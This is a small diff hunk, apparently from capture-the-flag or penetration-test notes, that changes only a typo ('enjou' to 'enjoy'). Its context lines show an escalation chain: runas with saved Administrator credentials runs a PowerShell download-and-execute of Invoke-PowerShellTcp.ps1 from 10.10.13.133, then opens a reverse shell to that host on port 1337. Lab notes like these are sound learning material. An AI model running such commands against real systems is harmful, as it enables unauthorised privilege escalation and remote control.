@@ -39,4 +39,4 @@ dir powershell.exe /s /p         ->  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\
 runas /savecred /user:Administrator "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.13.133:8000/Invoke-PowerShellTcp.ps1')"
 runas /savecred /user:Administrator "C:\Users\Administrator\Invoke-PowerShellTcp -Reverse -IPAddress 10.10.13.133 -Port 1337"
 
-enjou
+enjoy
